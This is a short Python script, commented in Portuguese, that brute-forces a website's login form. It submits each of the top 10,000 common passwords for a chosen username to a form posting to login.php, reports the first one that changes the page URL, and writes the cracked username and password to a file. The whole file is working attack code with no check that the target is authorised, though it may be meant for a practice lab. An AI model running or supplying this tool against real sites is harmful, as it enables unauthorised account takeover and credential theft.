import mechanicalsoup
 
user = input("Digite o nome de usuário: ")
site = input("Informe o site: ")
 
browser = mechanicalsoup.StatefulBrowser()
browser.open(site)
 
caminho_arquivo = '../datasets/10-million-password-list-top-10000.txt'
 
with open(caminho_arquivo, 'r') as arquivo:
    # Lê as linhas do arquivo
    lista_passwords = arquivo.readlines()
 
 
def gera_arquivo(user, password):
    # Define o nome do arquivo
    nome_arquivo = '../datasets/credenciais.txt'
 
    # Abre o arquivo para escrita usando 'with open'
    with open(nome_arquivo, 'w') as arquivo:
        # Escreve as variáveis no arquivo
        arquivo.write(f'user: {user}\n')
        arquivo.write(f'key: {password}\n')
 
    print(f"As credenciais foram salvas no arquivo '{nome_arquivo}'.")
 
 
def busca_vulnerabilidade():
    num_password = 0
    for password in lista_passwords:
        num_password += 1
        browser.select_form('form[action="login.php"]')
        browser['username'] = user
        browser['password'] = password.strip()
        browser.submit_selected()
 
        resposta_site = browser.get_url()
        if (resposta_site != site):
            print(f''' 
            --------------------------------------------------------------------
            Foi encontrado a vulnerabilidade no site: {resposta_site}
            Usuário com vulnerabilidade: {user}
            Senha: {password}
            --------------------------------------------------------------------
            '''
            )
            gera_arquivo(user, password)
            break
        else:
            print(f'''
            Acessando: {resposta_site}
            Password: {num_password} - Testando senha: {password}''')
 
 
busca_vulnerabilidade()